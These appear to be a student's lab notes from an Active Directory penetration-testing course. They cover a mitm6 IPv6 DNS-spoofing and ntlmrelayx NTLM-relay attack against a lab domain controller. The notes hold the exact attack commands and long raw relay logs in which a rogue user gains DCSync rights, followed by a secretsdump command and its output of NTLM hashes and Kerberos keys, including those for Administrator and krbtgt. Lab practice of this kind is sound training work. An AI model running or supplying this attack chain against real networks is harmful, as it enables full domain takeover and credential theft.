
# DO THE LAB HERE

```
impacket-ntlmrelayx -6 -t ldaps://<DC-IP> -wh fakewpad.marvel.local -l loot
```

```
sudo mitm6 marvel.local
```

reboot of a machine, or someone logging on

mitm6 can only be done in small sprints, do NOT leave it alone, 5-10 minutes MAXIMUM


user will not have access to domain admins but they have `Enterprise Admins` access, this SHOULD allow them to be able to use `secretsdump.py` to be able to dump out the hashes




## Lab

for safe measure have only DC be UP and running and then turn on punisher after everything is up

```
kali@kali ~> sudo mitm6 -d MARVEL.local
[sudo] password for kali:
Starting mitm6 using the following configuration:
Primary adapter: eth0 [00:0c:29:aa:d0:48]
IPv4 address: 192.168.176.128
IPv6 address: fe80::8c0a:45e8:a0db:320d
DNS local search domain: MARVEL.local
DNS allowlist: marvel.local
IPv6 address fe80::192:168:176:130 is now assigned to mac=00:0c:29:53:7d:28 host=PUNISHER.MARVEL.local. ipv4=192.168.176.130
Sent spoofed reply for wpad.MARVEL.local. to fe80::9015:5f15:d0f7:5363
Sent spoofed reply for wpad.marvel.local. to fe80::9015:5f15:d0f7:5363
Sent spoofed reply for fakewpad.marvel.local. to fe80::9015:5f15:d0f7:5363
Sent spoofed reply for fakewpad.marvel.local. to fe80::9015:5f15:d0f7:5363
Renew reply sent to fe80::192:168:176:130
Sent spoofed reply for fakewpad.marvel.local. to fe80::9015:5f15:d0f7:5363
Sent spoofed reply for fakewpad.marvel.local. to fe80::9015:5f15:d0f7:5363
Sent spoofed reply for fakewpad.marvel.local. to fe80::9015:5f15:d0f7:5363
Renew reply sent to fe80::192:168:176:130
Sent spoofed reply for fakewpad.marvel.local. to fe80::9015:5f15:d0f7:5363
Renew reply sent to fe80::192:168:176:130
Sent spoofed reply for fakewpad.marvel.local. to fe80::9015:5f15:d0f7:5363
^C
Shutting down packet capture after next packet...

```


## CLEANED UP OUTPUT

```
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Attempting to create user in: CN=Users,DC=MARVEL,DC=local
[*] Adding new user with username: ZFYTyjkzaS and password: ol4-b`S+\s>^<H; result: OK
```

## Secretsdump

```
kali@kali ~> secretsdump.py MARVEL.local/ZFYTyjkzaS:"ol4-b`S+\s>^<H;"@192.168.176.129
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:bfe44203e5edf12ba925fd7510cc11bb:::
MARVEL.local\tstark:1103:aad3b435b51404eeaad3b435b51404ee:1bc3af33d22c1c2baec10a32db22c72d:::
MARVEL.local\SQLService:1104:aad3b435b51404eeaad3b435b51404ee:f4ab68f27303bcb4024650d8fc5f973a:::
MARVEL.local\fcastle:1105:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
MARVEL.local\pparker:1106:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
ZFYTyjkzaS:2103:aad3b435b51404eeaad3b435b51404ee:14a024d509d1ef49cc7afd3fa975d8ab:::
HYDRA-DC$:1000:aad3b435b51404eeaad3b435b51404ee:000da82dd9ff3c760716ff02e5a926e5:::
PUNISHER$:2101:aad3b435b51404eeaad3b435b51404ee:44b68a86550cff9083755da2f4108ba3:::
SPIDERMAN$:2102:aad3b435b51404eeaad3b435b51404ee:73c579454e6ad41dd65eff5d110ef41a:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:3d7c382a48ac073163378e66b3f366ac45a5d9348a139a18304be0d3b6c5d8a2
Administrator:aes128-cts-hmac-sha1-96:9869e74d84205f1253ee19f716920d9d
Administrator:des-cbc-md5:7cea7076e9b07cfd
krbtgt:aes256-cts-hmac-sha1-96:eb53f86496fec435b394e5f808b32f0bb67455c2cae81256cdeccbb27941f142
krbtgt:aes128-cts-hmac-sha1-96:3ab89ab66d23171618a22d01a968c2d4
krbtgt:des-cbc-md5:a19215e3a8e66b3e
MARVEL.local\tstark:aes256-cts-hmac-sha1-96:c0253feb8fa1a0532844adabe1db7b12a0e9c2e12b84d6640ed886025c175b50
MARVEL.local\tstark:aes128-cts-hmac-sha1-96:68727fb995192f9766d6294ffd64080c
MARVEL.local\tstark:des-cbc-md5:f2253d9e1373adcd
MARVEL.local\SQLService:aes256-cts-hmac-sha1-96:7e434c38e06b23841e6764f58a7daaf8ab32c782b98c41e8a0cfe7bea0d00a93
MARVEL.local\SQLService:aes128-cts-hmac-sha1-96:0ad727708ef2aabfe159f71c579c9a0e
MARVEL.local\SQLService:des-cbc-md5:523d2c0ecdea6eba
MARVEL.local\fcastle:aes256-cts-hmac-sha1-96:35f093c1a2aafb4dffbf63201a8a9ec9171a621a3ff90b199bc92273a74d8409
MARVEL.local\fcastle:aes128-cts-hmac-sha1-96:7583c4fe87334691ef5e7fd863f636f9
MARVEL.local\fcastle:des-cbc-md5:4fa7ad454cc78954
MARVEL.local\pparker:aes256-cts-hmac-sha1-96:5fc6b0c6792c9a3b62432eda4a61e5c71efc2c57f5466abea92ac4c16fcae580
MARVEL.local\pparker:aes128-cts-hmac-sha1-96:7693d96d854240b8c654c1f8a86387e1
MARVEL.local\pparker:des-cbc-md5:e3d640734938ec34
ZFYTyjkzaS:aes256-cts-hmac-sha1-96:45617c6d657e599b1f468b13d3966386232c52cb611d21c73589268fd5ba8ab5
ZFYTyjkzaS:aes128-cts-hmac-sha1-96:a4d1797e9ee2363632f887ea5873b4e6
ZFYTyjkzaS:des-cbc-md5:a27351ba587a5416
HYDRA-DC$:aes256-cts-hmac-sha1-96:8db66ea6751e8ccbc51b3753c87c4edbde0ac2da38e6cefd5ab45f1c5bdd89d6
HYDRA-DC$:aes128-cts-hmac-sha1-96:87776e3ab777b249fd4d62de913eab53
HYDRA-DC$:des-cbc-md5:0726766ebafdbf04
PUNISHER$:aes256-cts-hmac-sha1-96:324ed80b106e2a3fedc0334d672534dbed01de4058be2b0b1655b52b69d79a95
PUNISHER$:aes128-cts-hmac-sha1-96:87f6cd814f70d16edcba3aebcce752ca
PUNISHER$:des-cbc-md5:02cd46cd94cb4f6b
SPIDERMAN$:aes256-cts-hmac-sha1-96:50173ddc56b857c20170d9bc2bdffc32f98a43d28e78351a841e9fcb921194a7
SPIDERMAN$:aes128-cts-hmac-sha1-96:7d22add42ccecaac83edb4d699de4983
SPIDERMAN$:des-cbc-md5:6d5dc8929773c426
[*] Cleaning up...
```

NOT CLEANED UP

```
kali@kali ~> ntlmrelayx.py -6 -t ldaps://192.168.176.129 -wh fakewpad.marvel.local -l loot1
Impacket v0.9.19 - Copyright 2019 SecureAuth Corporation

[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
/usr/share/offsec-awae-wheels/pyOpenSSL-19.1.0-py2.py3-none-any.whl/OpenSSL/crypto.py:12: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server

[*] Servers started, waiting for connections
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: /wpad.dat
[*] HTTPD: Serving PAC file to client ::ffff:192.168.176.130
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://www.msftconnecttest.com/connecttest.txt
[*] HTTPD: Client requested path: http://ipv6.msftconnecttest.com/connecttest.txt
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\PUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\PUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] Dumping domain info for first time
[*] Domain info dumped into lootdir!
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Client requested path: http://go.microsoft.com/fwlink/?linkid=252669&clcid=0x409
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: v20.events.data.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\Administrator SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[*] Attempting to create user in: CN=Users,DC=MARVEL,DC=local
[*] Adding new user with username: ZFYTyjkzaS and password: ol4-b`S+\s>^<H; result: OK
[*] Querying domain security descriptor
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] Success! User ZFYTyjkzaS now has Replication-Get-Changes-All privileges on the domain
[*] Try using DCSync with secretsdump.py and this user :)
[*] Saved restore state to aclpwn-20240403-054841.restore
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\Administrator SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user, aborting.
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: api.msn.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: api.msn.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: api.msn.com:443
[-] Exception in HTTP request handler: 'NoneType' object has no attribute 'sendAuth'
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: cdn.onenote.net:443
[*] HTTPD: Client requested path: http://tile-service.weather.microsoft.com/en-us/livetile/preinstall?region=us&appid=c98ea5b0842dbb9405bbf071e1da76512d21fe36&form=threshold
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\Administrator SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\Administrator SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {0}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x00\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user, aborting.

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {2}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}

ACE
AceType: {0}
AceFlags: {18}
AceSize: {36}
AceLen: {32}

Ace:{

    Mask:{
        Mask: {983551}
    }

    Sid:{
        Revision: {1}
        SubAuthorityCount: {5}

        IdentifierAuthority:{
            Value: {'\x00\x00\x00\x00\x00\x05'}
        }
        SubLen: {20}
        SubAuthority: {'\x15\x00\x00\x00\x1b[\xac\xb9\x8a\xc6\xfa\xcbY=\xe4\xaa\x07\x02\x00\x00'}
    }
}
TypeName: {'ACCESS_ALLOWED_ACE'}
[*] User privileges found: Create user
[*] User privileges found: Adding user to a privileged group (Enterprise Admins)
[*] User privileges found: Modifying domain ACL
[-] New user already added. Refusing to add another
[-] Unable to escalate without a valid user, aborting.
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: www.bing.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: www.bing.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: www.bing.com:443
[-] Exception in HTTP request handler: 'NoneType' object has no attribute 'sendAuth'
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: v10.events.data.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: pti.store.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: pti.store.microsoft.com:443
[*] HTTPD: Client requested path: pti.store.microsoft.com:443
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\PUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: tsfe.trafficshaping.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: tsfe.trafficshaping.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.microsoftonline.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.microsoftonline.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: login.microsoftonline.com:443
[-] Exception in HTTP request handler: 'NoneType' object has no attribute 'sendAuth'
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: tsfe.trafficshaping.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: tsfe.trafficshaping.dsp.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: fe2cr.update.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: v10.events.data.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: fe2cr.update.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: fe2cr.update.microsoft.com:443
[*] HTTPD: Client requested path: fe2cr.update.microsoft.com:443
[*] Authenticating against ldaps://192.168.176.129 as MARVEL\PUNISHER$ SUCCEED
[*] Enumerating relayed user's privileges. This may take a while on large domains
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
[*] HTTPD: Client requested path: fe3cr.delivery.mp.microsoft.com:443
[*] HTTPD: Received connection from ::ffff:192.168.176.130, attacking target ldaps://192.168.176.129
